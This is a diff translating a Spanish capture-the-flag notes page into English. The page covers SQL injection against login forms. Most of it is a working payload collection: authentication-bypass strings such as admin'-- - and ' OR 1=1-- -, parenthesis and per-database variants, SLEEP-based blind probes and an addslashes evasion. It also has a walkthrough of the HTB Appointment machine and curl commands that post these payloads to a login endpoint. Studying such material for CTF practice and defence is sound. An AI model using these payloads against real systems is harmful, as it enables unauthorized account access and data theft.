@@ -19,68 +19,68 @@ tags: [web, sqli]
 
 ---
 
-## Login Panel Bypass — SQLi en formularios de login
+## Login Panel Bypass — SQLi in login forms
 
-El patrón típico de una query de login vulnerable es:
+The typical pattern of a vulnerable login query is:
 
 ```sql
 SELECT * FROM users WHERE username='$user' AND password='$pass'
 ```
 
-Si la app concatena tu input directamente sin sanitizar, puedes manipular la lógica SQL para autenticarte sin credenciales válidas. El objetivo es hacer que la condición `WHERE` siempre evalúe a `TRUE`.
+If the app concatenates your input directly without sanitization, you can manipulate the SQL logic to authenticate without valid credentials. The goal is to make the `WHERE` condition always evaluate to `TRUE`.
 
-### Paso 1 — Entender el contexto de inyección
+### Step 1 — Understand the injection context
 
-Prueba **ambos campos** (username y password) por separado:
+Test **both fields** (username and password) separately:
 
 ```bash
-# Test 1: ¿Error con single quote en username?
+# Test 1: Error with single quote in username?
 Username: admin'
 Password: test
 
-# Test 2: ¿Error con double quote?
+# Test 2: Error with double quote?
 Username: admin"
 Password: test
 
-# Test 3: ¿Error en el campo password?
+# Test 3: Error in the password field?
 Username: admin
 Password: test'
 
-# Test 4: ¿Backslash?
+# Test 4: Backslash?
 Username: admin\
 Password: test
 ```
 
-> 💡 **Si ves un error SQL** → la app es vulnerable y sabes dónde inyectar.
-> 💡 **Si no ves error pero la página cambia** (ej. "Wrong password" vs página en blanco) → posible boolean blind.
-> 💡 **Si no hay diferencia visible** → prueba time-based blind.
-> 💡 **Si no hay errores ni cambios pero el login funciona con `admin'-- -`** → la app es silenciosamente vulnerable — el SQL injection funcionó pero los errores están suprimidos. Este es el escenario CTF más común.
+> 💡 **If you see a SQL error** → the app is vulnerable and you know where to inject.
+> 💡 **If no error but the page changes** (e.g. "Wrong password" vs blank page) → possible boolean blind.
+> 💡 **If no visible difference** → try time-based blind.
+> 💡 **If no errors or changes but login works with `admin'-- -`** → the app is silently vulnerable — the SQL injection worked but errors are suppressed. This is the most common CTF scenario.
 
-### Ejemplo real — HTB Appointment
+### Real example — HTB Appointment
 
-Este bypass exacto funciona en la máquina **Appointment**:
+This exact bypass works on the **Appointment** machine:
 
 ```
-1. Login form con username + password
-2. Gobuster no revela paths ocultos → el login ES la superficie de ataque
-3. Test: admin' en username → sin error visible
-4. Payload: admin'-- - en username, contraseña vacía → ✅ LOGIN
-5. Query subyacente: SELECT * FROM users WHERE username='admin'-- -' AND password=''
-6. El -- - comenta el password check → autenticado como admin
+1. Login form with username + password
+2. Gobuster reveals no hidden paths → the login IS the attack surface
+3. Test: admin' in username → no visible error
+4. Payload: admin'-- - in username, empty password → ✅ LOGIN
+5. Underlying query: SELECT * FROM users WHERE username='admin'-- -' AND password=''
+6. The -- - comments out the password check → authenticated as admin
 ```
 
-**Lecciones clave de Appointment:**
-- **Sin error ≠ sin vulnerabilidad** — la inyección funcionó silenciosamente
-- **Gobuster primero** — confirma que no hay endpoints ocultos antes de enfocarte en el login
-- **`admin'-- -` con contraseña vacía** — prueba esto antes que cualquier payload complejo
-- **La flag estaba en el dashboard** — sin escalada de privilegios, sin lectura de archivos
+**Key lessons from Appointment:**
+- **No error ≠ no vulnerability** — the injection worked silently
+- **Gobuster first** — confirm there are no hidden endpoints before focusing on the login
+- **`admin'-- -` with empty password** — test this before any complex payload
+- **The flag was on the dashboard** — no privilege escalation, no file reading
 
-### Paso 2 — Payloads clásicos de bypass
+### Step 2 — Classic bypass payloads
 
-Prueba estos en el campo **username**, dejando la contraseña vacía o con cualquier valor:
+Try these in the **username** field, leaving the password empty or with any value:
 
 ```sql
--- Payloads universales (funcionan en MySQL, PostgreSQL, MSSQL)
+-- Universal payloads (work on MySQL, PostgreSQL, MSSQL)
 admin'-- -
 admin'#
 admin'/*
@@ -94,7 +94,7 @@ admin'/*
 ') OR 1=1-- -
 admin' OR '1'='1
 
--- Sin conocer ningún username — OR devuelve el primer usuario
+-- Without knowing any username — OR returns the first user
 ' OR '1'='1'-- -
 ' OR 1=1-- -
 ' OR 1=1#
@@ -102,18 +102,18 @@ admin' OR '1'='1
 OR 1=1-- -
 OR '1'='1'-- -
 
--- Admin-specific — si sabes que el usuario admin existe
+-- Admin-specific — if you know the admin user exists
 admin'-- -
 admin' #
 admin'/*
 ```
 
-### Paso 3 — Si hay paréntesis en la query
+### Step 3 — If there are parentheses in the query
 
-Muchas apps usan funciones como `MD5()`, `SHA1()`, o simplemente paréntesis:
+Many apps use functions like `MD5()`, `SHA1()`, or simply parentheses:
 
 ```sql
--- Ejemplo de query vulnerable con hash:
+-- Example of vulnerable query with hash:
 -- SELECT * FROM users WHERE (username='$user') AND (password=MD5('$pass'))
 
 ') OR 1=1-- -
@@ -121,49 +121,49 @@ Muchas apps usan funciones como `MD5()`, `SHA1()`, o simplemente paréntesis:
 ') OR 1=1#
 ') OR ('1'='1')-- -
 
--- Doble paréntesis
+-- Double parentheses
 ')) OR 1=1-- -
 ')) OR ('1'='1
 
--- Con hash en password
+-- With hash on password
 admin')-- -
 ') OR 1=1) AND ('x'='x
 ' OR 1=1) AND MD5('x')=MD5('x
 ```
 
-### Payloads específicos por DBMS
+### DBMS-specific payloads
 
-| DBMS | Payload | Nota |
+| DBMS | Payload | Note |
 | :--- | :------ | :--- |
-| **MySQL** | `admin'-- -` | Espacio después de `--` es obligatorio |
-| **MySQL** | `admin'#` | `#` no necesita espacio |
-| **MySQL** | `admin'/*` | Comentario inline sin cerrar |
-| **PostgreSQL** | `admin'--` | `--` sin espacio extra |
-| **PostgreSQL** | `admin'/**/` | Comentario inline |
-| **MSSQL** | `admin'--` | Igual que PostgreSQL |
-| **Oracle** | `admin'--` | Oracle `--` necesita espacio |
-| **SQLite** | `admin'--` | `--` con o sin espacio |
+| **MySQL** | `admin'-- -` | Space after `--` is mandatory |
+| **MySQL** | `admin'#` | `#` doesn't need a space |
+| **MySQL** | `admin'/*` | Unclosed inline comment |
+| **PostgreSQL** | `admin'--` | `--` without extra space |
+| **PostgreSQL** | `admin'/**/` | Inline comment |
+| **MSSQL** | `admin'--` | Same as PostgreSQL |
+| **Oracle** | `admin'--` | Oracle `--` needs a space |
+| **SQLite** | `admin'--` | `--` with or without space |
 
 ---
 
-## Quick checklist para formularios de login
+## Quick checklist for login forms
 
-1. **Test `'` en username** → si hay error SQL → vulnerable
-2. **`admin'-- -`** → bypass clásico si admin existe
-3. **`' OR 1=1-- -`** → bypass sin conocer un username
-4. **`') OR 1=1-- -`** → si hay paréntesis
-5. **`' OR 1=1#`** → comentario alternativo
-6. **Si nada funciona** → prueba time-based blind con `SLEEP()`
-7. **No olvides el campo password** → a veces es vulnerable aunque username no lo sea
+1. **Test `'` in username** → if SQL error → vulnerable
+2. **`admin'-- -`** → classic bypass if admin exists
+3. **`' OR 1=1-- -`** → bypass without knowing a username
+4. **`') OR 1=1-- -`** → if there are parentheses
+5. **`' OR 1=1#`** → alternative comment
+6. **If nothing works** → try time-based blind with `SLEEP()`
+7. **Don't forget the password field** → sometimes it's vulnerable even if username isn't
 
-### curl para testear formularios manualmente
+### curl for manual form testing
 
 ```bash
-# POST básico
+# Basic POST
 curl -d "user=admin'-- -&pass=" http://target.htb/login.php
 curl -d "user=' OR 1=1-- -&pass=" http://target.htb/login.php
 
-# Con --data-urlencode si necesitas encoding explícito
+# With --data-urlencode if you need explicit encoding
 curl --data-urlencode "user=' OR 1=1-- -" --data-urlencode "pass=" http://target.htb/login.php
 
 # JSON login
@@ -171,20 +171,20 @@ curl -X POST http://target.htb/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"admin'"'"'-- -","password":"test"}'
 
-# Seguir redirects y mostrar headers (para ver session Set-Cookie)
+# Follow redirects and show headers (to see session Set-Cookie)
 curl -d "user=admin'-- -&pass=" http://target.htb/login.php -L -v
 ```
 
 ---
 
-## Errores comunes en CTFs
+## Common CTF errors
 
-| Error | Solución |
+| Error | Solution |
 | :---- | :------ |
-| Single quotes no rompen la query | Prueba double quotes, backslash, paréntesis, o sin quote (contexto integer) |
-| El comentario no funciona | Prueba `-- -`, `--`, `#`, `/**/`, o `;` (stacked) |
-| Sin diferencia visible entre true/false | Prueba time-based: `' OR IF(1=1,SLEEP(3),0)-- -` |
-| El servidor usa `addslashes()` / magic quotes | Prueba `admin\' OR 1=1-- -` (backslash escapa el escape) |
+| Single quotes don't break the query | Try double quotes, backslash, parentheses, or no quote (integer context) |
+| The comment doesn't work | Try `-- -`, `--`, `#`, `/**/`, or `;` (stacked) |
+| No visible difference between true/false | Try time-based: `' OR IF(1=1,SLEEP(3),0)-- -` |
+| Server uses `addslashes()` / magic quotes | Try `admin\' OR 1=1-- -` (backslash escapes the escape) |
 
 ---
 
